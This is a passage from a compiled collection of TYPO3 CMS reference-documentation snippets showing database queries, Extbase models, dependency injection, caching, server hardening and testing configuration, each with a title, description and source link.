Vendor\\MyExtension\\Domain\\Model;\n\nclass Blog {\n    /**\n     * File reference\n     *\n     * @var \\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference\n     */\n    protected $file;\n\n    // Getter and setter\n    public function getFile(): ?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference {\n        return $this->file;\n    }\n\n    public function setFile(\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference $file): void {\n        $this->file = $file;\n    }\n}\n```\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n// EXT:my_extension/Configuration/TCA/tx_myextension_domain_model_blog.php\nreturn [\n    'ctrl' => [\n        'title' => 'Blog',\n        'label' => 'title',\n    ],\n    'columns' => [\n        'file' => [\n            'exclude' => true,\n            'label' => 'File',\n            'config' => \\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::getFileFieldTCAConfig(\n                'file',\n                [\n                    'appearance' => [\n                        'createNewRelationLinkTitle' => 'Add File'\n                    ],\n                    'foreign_match_fields' => [\n                        'fieldname' => 'file',\n                        'tablenames' => 'tx_myextension_domain_model_blog',\n                        'table_local' => 'sys_file',\n                    ],\n                ]\n            ),\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Performing Database Insert in TYPO3\nDESCRIPTION: Example of using the Connection->insert() method to add a record to a database table. This method creates and executes an INSERT INTO statement with proper field and value quoting.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\npublic function someMethod(): void\n{\n    $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->insert(\n        'tx_myextension_domain_model_mytable',\n        [\n            'pid' => 42,\n            'name' => 'New record',\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Method Injection in TYPO3 Controller (PHP)\nDESCRIPTION: Shows method injection using an injectUserRepository method. The framework calls this method after instantiation to inject the UserRepository dependency.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse MyVendor\\MyExtension\\Domain\\Repository\\UserRepository;\n\nclass UserController\n{\n    private ?UserRepository $userRepository = null;\n\n    public function injectUserRepository(UserRepository $userRepository): void\n    {\n        $this->userRepository = $userRepository;\n    }\n\n    public function listAction(): void\n    {\n        $users = $this->userRepository->findAll();\n        // ...\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Directory Indexing in Apache Configuration\nDESCRIPTION: This snippet demonstrates how to disable directory indexing in an Apache web server by modifying the .htaccess file. It ensures that sensitive file structure data is not exposed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/DirectoryIndexing.rst#2025-04-16_snippet_0\n\nLANGUAGE: apacheconf\nCODE:\n```\n# Make sure that directory listings are disabled.\n<IfModule mod_autoindex.c>\n   Options -Indexes\n</IfModule>\n```\n\n----------------------------------------\n\nTITLE: Accessing QueryBuilder and Connection Objects in TYPO3\nDESCRIPTION: This example demonstrates how to access QueryBuilder or Connection objects from the ConnectionPool in TYPO3 by providing the table name to be queried.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ConnectionPool/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// Get a QueryBuilder for a single table\n$queryBuilder = GeneralUtility::makeInstance(ConnectionPool::class)\n    ->getQueryBuilderForTable('tx_myextension_domain_model_mytable');\n\n// Get a Connection for a single table\n$connection = GeneralUtility::makeInstance(ConnectionPool::class)\n    ->getConnectionForTable('tx_myextension_domain_model_mytable');\n```\n\n----------------------------------------\n\nTITLE: Using DateTime Aspect in TYPO3 PHP Controller\nDESCRIPTION: Shows how to use the DateTime aspect to get current timestamp and format it in a TYPO3 controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Context\\Context;\n\nclass MyController\n{\n    protected Context $context;\n\n    public function __construct(Context $context)\n    {\n        $this->context = $context;\n    }\n\n    public function myAction(): void\n    {\n        $currentTimestamp = $this->context->getPropertyFromAspect('date', 'timestamp');\n        $formattedDate = date('Y-m-d', $currentTimestamp);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Basic Services YAML Defaults in TYPO3\nDESCRIPTION: Basic services configuration file that sets up autowiring, autoconfiguration, and model exclusion for dependency injection in TYPO3 extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  MyVendor\\MyExtension\\:\n    resource: '../Classes/*'\n    exclude: '../Classes/Domain/Model/*'\n```\n\n----------------------------------------\n\nTITLE: Accessing Settings in TYPO3 Extbase Controller\nDESCRIPTION: Example demonstrating how to access configuration settings within an Extbase controller using $this->settings. This shows usage in a controller action with comments explaining the process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Configuration.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function listAction(): ResponseInterface\n{\n    // Access settings from TypoScript Setup and FlexForm\n    $limit = (int)($this->settings['limit'] ?? 10);\n    $blogEntries = $this->blogRepository->findLatest($limit);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Caching Backend in TYPO3\nDESCRIPTION: Example configuration for setting up the Redis caching backend in TYPO3. This code shows how to configure different caches with separate Redis databases to prevent key collisions between cache types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/FrontendsBackends/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n// Define names for caches that should go into own redis databases\n// this array maps cache identifiers to database numbers\n$redisCaches = [\n    // frontend caches\n    'pages' => 1,\n    'pagesection' => 2,\n    'rootline' => 3,\n    'hash' => 4,\n    // core internal caches\n    'extbase' => 10,\n    'fluid_template' => 11,\n];\n// Add redistribution config for registered caches\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations'] = array_map(\n    function ($cacheName) use ($redisCaches) {\n        $conf = $GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations'][$cacheName] ?? [];\n        if (isset($redisCaches[$cacheName])) {\n            if (!isset($conf['backend'])) {\n                $conf['backend'] = \\TYPO3\\CMS\\Core\\Cache\\Backend\\RedisBackend::class;\n            }\n            if (!isset($conf['options'])) {\n                $conf['options'] = [];\n            }\n            $conf['options']['database'] = $redisCaches[$cacheName];\n        }\n        return $conf;\n    },\n    array_keys($GLOBALS['TYPO3_CONF_VARS']['SYS']['caching']['cacheConfigurations'])\n);\n\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforePageIsRetrievedEvent Listener in TYPO3\nDESCRIPTION: Example implementation of an event listener for BeforePageIsRetrievedEvent that demonstrates how to modify page resolving behavior. This listener can alter the incoming page ID or provide a pre-loaded page object before TYPO3's default behavior executes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Domain/BeforePageIsRetrievedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\\n\\nnamespace MyVendor\\MyExtension\\Domain\\Access;\\n\\nuse TYPO3\\CMS\\Core\\Domain\\Event\\BeforePageIsRetrievedEvent;\\n\\nclass MyEventListener\\n{\\n    public function __invoke(BeforePageIsRetrievedEvent $event): void\\n    {\\n        // Get current page id\\n        $pageId = $event->getPageId();\\n\\n        // Modify page id\\n        $event->setPageId($pageId);\\n\\n        // Or set complete page array\\n        $event->setPageRecord([\\n            'uid' => 123,\\n            'title' => 'My Page',\\n            // ...\\n        ]);\\n    }\\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Message Class in PHP for the TYPO3 Message Bus\nDESCRIPTION: Sample implementation of a message class that can be dispatched via the TYPO3 message bus. This is a simple PHP class that holds data to be processed by a handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Queue\\Message;\n\nclass DemoMessage\n{\n    protected string $payload;\n\n    public function __construct(string $payload)\n    {\n        $this->payload = $payload;\n    }\n\n    public function getPayload(): string\n    {\n        return $this->payload;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing InputTextElement with Custom Wizards in TYPO3\nDESCRIPTION: This snippet demonstrates how to implement an InputTextElement with custom field wizards in TYPO3. It shows the structure of the element class and how to define and render default field wizards.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\nprotected $defaultFieldWizard = [\n    'localizationStateSelector' => [\n        'renderType' => 'localizationStateSelector',\n    ],\n    'otherLanguageContent' => [\n        'renderType' => 'otherLanguageContent',\n        'after' => [\n            'localizationStateSelector'\n        ]\n    ],\n    'defaultLanguageDifferences' => [\n        'renderType' => 'defaultLanguageDifferences',\n        'after' => [\n            'otherLanguageContent',\n        ],\n    ],\n];\n\nprotected function renderFieldWizard(): string\n{\n    $result = '';\n    $result .= $this->renderFieldWizards();\n    return $result;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Post Model with Blog Reference in Extbase\nDESCRIPTION: This code shows how to implement the Post side of a 1:n relationship with a Blog model in Extbase, with bidirectional mapping and proper getters and setters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Domain/Model.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n/**\n * The blog this post belongs to\n *\n * @var \\MyVendor\\MyExtension\\Domain\\Model\\Blog\n */\nprotected $blog;\n\n/**\n * Get the blog this post belongs to\n *\n * @return \\MyVendor\\MyExtension\\Domain\\Model\\Blog\n */\npublic function getBlog()\n{\n    return $this->blog;\n}\n\n/**\n * Set the blog this post belongs to\n *\n * @param \\MyVendor\\MyExtension\\Domain\\Model\\Blog $blog\n */\npublic function setBlog(\\MyVendor\\MyExtension\\Domain\\Model\\Blog $blog)\n{\n    $this->blog = $blog;\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Bulk Insert in TYPO3 Database\nDESCRIPTION: Example of using the bulkInsert() method to insert multiple rows at once. This method provides better performance for inserting multiple records compared to individual insert() calls.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\npublic function someMethod(): void\n{\n    $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->bulkInsert(\n        'tx_myextension_domain_model_mytable',\n        [\n            [42, 'Chuck Norris'],\n            [43, 'Bruce Willis'],\n        ],\n        ['pid', 'name'],\n        [\n            Connection::PARAM_INT,\n            Connection::PARAM_STR,\n        ]\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Nginx Content Security Policy Configuration for Fileadmin\nDESCRIPTION: Nginx configuration using a map to set Content Security Policy headers specifically for files in the fileadmin directory, preventing script and style execution\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/ContentSecurityPolicy.rst#2025-04-16_snippet_1\n\nLANGUAGE: nginx\nCODE:\n```\nmap $request_uri $csp_header {\n    ~^/fileadmin/ \"default-src 'self'; script-src 'none'; style-src 'none'; object-src 'none';\"\n}\n\nserver {\n    # Add strict CSP header depending on mapping (fileadmin only)\n    add_header Content-Security-Policy $csp_header;\n    # ... other add_header declarations can follow here\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Interface Binding in TYPO3 Global Services YAML\nDESCRIPTION: This YAML configuration binds the PSR-20 clock interface to a concrete implementation from the lcobucci/clock package, allowing for dependency injection of the clock interface throughout the project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n\n  # Configure interface binding\n  # Interface is from PSR-20, implementation from lcobucci/clock\n  Psr\\Clock\\ClockInterface:\n    class: Lcobucci\\Clock\\SystemClock\n    factory: ['Lcobucci\\Clock\\SystemClock', 'fromSystemTimezone']\n```\n\n----------------------------------------\n\nTITLE: Enabling OPcache for TYPO3 Performance in PHP.ini\nDESCRIPTION: Basic OPcache configuration in php.ini that enables the opcode cache with recommended settings for TYPO3. This configuration sets revalidate frequency to 30 seconds and disables path revalidation for better performance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/TuneTYPO3.rst#2025-04-16_snippet_0\n\nLANGUAGE: ini\nCODE:\n```\nopcache.enable=1\nopcache.revalidate_freq=30\nopcache.revalidate_path=0\n```\n\n----------------------------------------\n\nTITLE: Escaping LIKE Wildcards in TYPO3 Query Builder\nDESCRIPTION: Shows how to properly escape wildcard characters in LIKE queries while maintaining SQL injection protection using escapeLikeWildcards().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_32\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// SELECT `uid` FROM `tt_content` WHERE (`bodytext` LIKE '%kl\\\\%aus%')\n$searchWord = 'kl%aus';\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->like(\n            'bodytext',\n            $queryBuilder->createNamedParameter('%' . $queryBuilder->escapeLikeWildcards($searchWord) . '%', Connection::PARAM_STR)\n        )\n    );\n```\n\n----------------------------------------\n\nTITLE: Executing UPDATE Query with QueryBuilder in TYPO3 CMS\nDESCRIPTION: Shows how to create and execute an UPDATE query using the QueryBuilder. It includes setting the table, conditions, and the values to be updated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: PHP\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// UPDATE `tt_content` SET `bodytext` = 'dolor' WHERE `bodytext` = 'lorem'\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->update('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq('bodytext', $queryBuilder->createNamedParameter('lorem', Connection::PARAM_STR))\n    )\n    ->set('bodytext', 'dolor')\n    ->executeStatement();\n```\n\n----------------------------------------\n\nTITLE: Generating TYPO3 Encryption Key using OpenSSL\nDESCRIPTION: Demonstrates creating a secure 96-character hexadecimal encryption key using OpenSSL command line tool. This key is used for various encryption and validation purposes in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/InstallTool.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nopenssl rand -hex 48\n```\n\n----------------------------------------\n\nTITLE: Using the BeforeUserLogoutEvent in TYPO3 CMS\nDESCRIPTION: This snippet shows the BeforeUserLogoutEvent PHP class from TYPO3 Core API. The event is triggered before a user logs out and allows for custom actions or even bypassing the regular logout process.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/BeforeUserLogoutEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Authentication\\Event\\BeforeUserLogoutEvent\n```\n\n----------------------------------------\n\nTITLE: Accessing the Backend User Object in TYPO3\nDESCRIPTION: Shows how to access the Backend User Authentication object in TYPO3 through the global variable $GLOBALS['BE_USER']. This object represents the currently logged-in backend user and provides methods for checking permissions and user settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/BackendUsers/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['BE_USER']\n```\n\n----------------------------------------\n\nTITLE: Custom HTML Elements with lit-element\nDESCRIPTION: Shows how to create custom web components using lit-element with property decorators and template rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Templating/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\nimport {LitElement, html, customElement, property} from 'lit-element';\n\n@customElement('my-element')\nclass MyElement extends LitElement {\n\n // Declare observed properties\n @property()\n value: string = 'awesome';\n\n // Avoid Shadow DOM so global styles apply to the element contents\n createRenderRoot(): Element|ShadowRoot {\n   return this;\n }\n\n // Define the element's template\n render() {\n   return html`<p>Hello ${this.value}!</p>`;\n }\n}\n```\n\nLANGUAGE: html\nCODE:\n```\n<my-element value=\"World\"></my-element>\n```\n\nLANGUAGE: html\nCODE:\n```\n<my-element value=\"World\">\n   <p>Hello world!</p>\n</my-element>\n```\n\n----------------------------------------\n\nTITLE: Implementing CustomCategoryProcessor Class for TYPO3\nDESCRIPTION: This PHP class implements the DataProcessorInterface to create a custom data processor. It processes category data from content elements and prepares it for use in Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomDataProcessing.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace T3docs\\Examples\\DataProcessing;\n\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\DataProcessorInterface;\nuse TYPO3\\CMS\\Core\\Domain\\Repository\\PageRepository;\n\nclass CustomCategoryProcessor implements DataProcessorInterface\n{\n    protected PageRepository $pageRepository;\n\n    public function __construct(PageRepository $pageRepository)\n    {\n        $this->pageRepository = $pageRepository;\n    }\n\n    public function process(\n        ContentObjectRenderer $cObj,\n        array $contentObjectConfiguration,\n        array $processorConfiguration,\n        array $processedData\n    ): array {\n        if (isset($processorConfiguration['if.']) && !$cObj->checkIf($processorConfiguration['if.'])) {\n            return $processedData;\n        }\n\n        // Category list parsing\n        $categoryList = $cObj->stdWrapValue('categoryList', $processorConfiguration);\n\n        // Process categories to an array\n        if (!empty($categoryList)) {\n            $categoryIds = GeneralUtility::intExplode(',', $categoryList, true);\n            $categories = [];\n            foreach ($categoryIds as $categoryId) {\n                $category = $this->pageRepository->getPage($categoryId);\n                if ($category) {\n                    $categories[] = $category;\n                }\n            }\n\n            $targetVariableName = $cObj->stdWrapValue('as', $processorConfiguration, 'categories');\n            $processedData[$targetVariableName] = $categories;\n        }\n\n        return $processedData;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Extbase Model-to-Database Mapping in TYPO3 PHP\nDESCRIPTION: Defines the mapping configuration between domain models and database tables for a blog system. Maps Administrator to fe_users table, FrontendUserGroup to fe_groups table, and custom Blog and Post models to their respective tables with specific property mappings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Persistence/ExtbasePersistenceClasses.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nuse T3docs\\BlogExample\\Domain\\Model\\Administrator;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\nuse T3docs\\BlogExample\\Domain\\Model\\FrontendUserGroup;\nuse T3docs\\BlogExample\\Domain\\Model\\Post;\n\nreturn [\n    Administrator::class => [\n        'tableName' => 'fe_users',\n        'recordType' => Administrator::class,\n        'properties' => [\n            'administratorName' => [\n                'fieldName' => 'username',\n            ],\n        ],\n    ],\n    FrontendUserGroup::class => [\n        'tableName' => 'fe_groups',\n    ],\n    Blog::class => [\n        'tableName' => 'tx_blogexample_domain_model_blog',\n        'properties' => [\n            'categories' => [\n                'fieldName' => 'category',\n            ],\n        ],\n    ],\n    Post::class => [\n        'tableName' => 'tx_blogexample_domain_model_post',\n        'properties' => [\n            'categories' => [\n                'fieldName' => 'category',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Using quoteIdentifier in TYPO3 Query Builder\nDESCRIPTION: Demonstrates usage of quoteIdentifier() for safely quoting field names and table identifiers in database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_31\n\nLANGUAGE: php\nCODE:\n```\n// SELECT `uid` FROM `tt_content` WHERE (`header` = `bodytext`)\n// Return list of rows where header and bodytext values are identical\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$queryBuilder\n    ->select('uid')\n    ->from('tt_content')\n    ->where(\n        $queryBuilder->expr()->eq(\n            'header',\n            $queryBuilder->quoteIdentifier('bodytext')\n        )\n    );\n```\n\n----------------------------------------\n\nTITLE: Retrieving Expression Builder Instance in PHP\nDESCRIPTION: Shows how to get an instance of the ExpressionBuilder from the QueryBuilder object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$expressionBuilder = $queryBuilder->expr();\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Record Object Usage in Fluid Template\nDESCRIPTION: This code snippet showcases various ways to access properties of a Record object in a Fluid template. It demonstrates accessing standard properties, language and workspace information, and raw record data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DatabaseRecords/RecordObjects.rst#2025-04-16_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<h2>{record.title}</h2>\n<p>{record.uid}</p>\n<p>{record.languageId}</p>\n<p>{record.versionInfo.workspaceId}</p>\n<f:debug>{record}</f:debug>\n\n{* Access properties of raw record *}\n{record.rawRecord.lastModified}\n```\n\n----------------------------------------\n\nTITLE: Setting Up GitHub Actions Workflow for TYPO3\nDESCRIPTION: This snippet defines the workflow steps to be executed in GitHub Actions for a TYPO3 project. It includes steps for checking out the repository, setting up DDEV, importing a database and files, installing Composer packages, adjusting permissions, and running acceptance tests. Each step uses specific GitHub Action commands.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Acceptance.rst#2025-04-16_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\nruns-on: ubuntu-20.04\n       steps:\n         - name: Checkout\n           uses: actions/checkout@v2\n\n         - name: Start DDEV\n           uses: jonaseberle/github-action-setup-ddev@v1\n\n         - name: Import database\n           run: ddev import-db --src=./data/db.sql\n\n         - name: Import files\n           run: ddev import-files --src=./assets\n\n         - name: Install Composer packages\n           run: ddev composer install\n\n         - name: Allow public access of var folder\n           run: sudo chmod 0777 ./var\n\n         - name: Run acceptance tests\n           run: ddev exec bin/codecept run acceptance -d -c Tests/codeception.yml\n```\n\n----------------------------------------\n\nTITLE: Extended composer.json Configuration for TYPO3\nDESCRIPTION: This snippet provides an extended setup for a composer.json file within a TYPO3 extension context. It includes additional configurations such as 'require', 'suggest', and 'autoload' for comprehensive dependency management and loading order control. This setup is particularly useful for extensions with complex dependency requirements and optional dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ComposerJson.rst#2025-04-16_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"my-vendor/my-extension\",\n    \"description\": \"1 line description\",\n    \"type\": \"typo3-cms-extension\",\n    \"license\": \"GPL-2.0-or-later\",\n    \"require\": {\n        \"typo3/cms-core\": \"^9.5\"\n    },\n    \"suggest\": {\n        \"typo3/cms-about\": \"\"\n    },\n    \"autoload\": {\n        \"psr-4\": {\n            \"MyVendor\\\\MyExtension\\\\\": \"Classes/\"\n        }\n    },\n    \"extra\": {\n        \"typo3/cms\": {\n            \"extension-key\": \"my_extension\"\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Password Hash for TYPO3 Frontend\nDESCRIPTION: This snippet demonstrates how to create a new password hash from a given plain-text password for a TYPO3 frontend user. It uses the PasswordHashFactory to get the default hashing instance and then generates the hashed password.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PasswordHashing/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// Given plain text password\n$password = 'someHopefullyGoodAndLongPassword';\n$hashInstance = GeneralUtility::makeInstance(PasswordHashFactory::class)->getDefaultHashInstance('FE');\n$hashedPassword = $hashInstance->getHashedPassword($password);\n```\n\n----------------------------------------\n\nTITLE: Performing Database Update in TYPO3\nDESCRIPTION: Example of using the Connection->update() method to modify existing records. This method creates and executes an UPDATE statement with WHERE conditions limited to equality comparisons.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Connection/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\npublic function someMethod(): void\n{\n    $connection = $this->connectionPool->getConnectionForTable('tx_myextension_domain_model_mytable');\n    $connection->update(\n        'tx_myextension_domain_model_mytable', // table name\n        ['storage_title' => 'Offline'], // SET\n        ['storage_uid' => 42], // WHERE\n        [\n            Connection::PARAM_STR,\n            Connection::PARAM_INT,\n        ] // define parameter types\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Type Hinting in PHP Function Parameters\nDESCRIPTION: Demonstrates proper type hinting for function parameters, including class and array type hints\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_23\n\nLANGUAGE: php\nCODE:\n```\nprotected function executeAction(MyAction &$action, array $extraParameters)\n{\n    // Do something\n}\n```\n\n----------------------------------------\n\nTITLE: Requiring MFA for Users via TSconfig\nDESCRIPTION: TSconfig configuration to enforce multi-factor authentication for specific users or user groups. This setting overrides the global MFA requirement configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nauth.mfa.required = 1\n```\n\n----------------------------------------\n\nTITLE: Listing Available Commands in TYPO3 (Legacy)\nDESCRIPTION: Shows how to list all available console commands in a legacy TYPO3 installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3\n```\n\n----------------------------------------\n\nTITLE: Implementing HaikuSeasonList Middleware in PHP for TYPO3 CMS\nDESCRIPTION: This code defines a middleware class HaikuSeasonList that processes requests for a specific URL segment '/haiku-season-list.json'. It returns a JSON response containing season data if the URL matches, otherwise passes the request to the next handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/_php/_ProcessMiddleware.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Psr\\Http\\Server\\RequestHandlerInterface;\n\nfinal readonly class HaikuSeasonList implements MiddlewareInterface\n{\n    private const URL_SEGMENT = '/haiku-season-list.json';\n\n    public function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface\n    {\n        if (!str_contains($request->getUri()->getPath(), self::URL_SEGMENT)) {\n            return $handler->handle($request);\n        }\n\n        $seasons = json_encode($this->getSeasons($request), JSON_THROW_ON_ERROR);\n\n        return $this->responseFactory->createResponse()\n            ->withHeader('Content-Type', 'application/json')\n            ->withBody($this->streamFactory->createStream($seasons));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing an ItemsProcFunc for Dynamic Select 